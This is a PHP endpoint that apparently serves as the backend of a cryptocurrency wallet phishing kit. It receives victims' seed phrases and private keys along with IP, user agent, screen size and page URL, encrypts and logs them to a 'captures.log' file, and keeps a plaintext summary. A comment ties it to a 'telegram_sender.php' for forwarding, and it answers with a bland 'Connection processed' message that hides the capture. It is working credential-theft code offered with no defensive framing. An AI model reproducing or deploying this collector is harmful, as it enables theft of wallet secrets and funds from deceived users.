<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); echo json_encode(['error' => 'POST only']); exit; }

$ENCRYPTION_KEY = 'Valtix_Render_2026_SecretKey!!';
$ENCRYPTION_IV  = '1234567890abcdef';
$LOG_DIR        = __DIR__ . '/logs';
$LOG_FILE       = $LOG_DIR . '/captures.log';

if (!is_dir($LOG_DIR)) mkdir($LOG_DIR, 0755, true);

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { http_response_code(400); echo json_encode(['error' => 'Invalid JSON']); exit; }

$seed = trim($input['seed'] ?? '');
$pkey = trim($input['pkey'] ?? '');

// Store using field names 'seed' and 'pkey' — telegram_sender.php reads these
$capture = [
    'id'         => $input['id'] ?? substr(md5(uniqid(mt_rand(), true)), 0, 12),
    'wallet'     => $input['wallet'] ?? 'unknown',
    'walletName' => $input['walletName'] ?? ucfirst($input['wallet'] ?? 'Unknown'),
    'seed'       => $seed,
    'pkey'       => $pkey,
    'seedWordCount' => !empty($seed) ? count(explode(' ', $seed)) : 0,
    'timestamp'  => $input['timestamp'] ?? date('Y-m-d H:i:s'),
    'ip'         => $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
    'userAgent'  => $input['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '',
    'screenSize' => $input['screenSize'] ?? '',
    'url'        => $input['url'] ?? '',
    'capturedAt' => date('Y-m-d H:i:s'),
];

$json = json_encode($capture);
$encrypted = base64_encode(openssl_encrypt($json, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV));

file_put_contents($LOG_FILE, $encrypted . "\n", FILE_APPEND);

// Log summary (non-encrypted for quick review)
$summaryLine = "[" . date('Y-m-d H:i:s') . "] Wallet: {$capture['walletName']} | IP: {$capture['ip']} | Seed: " . (!empty($seed) ? 'YES' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . "\n";
file_put_contents($LOG_DIR . '/summary.log', $summaryLine, FILE_APPEND);

echo json_encode(['status' => 'ok', 'message' => 'Connection processed']);
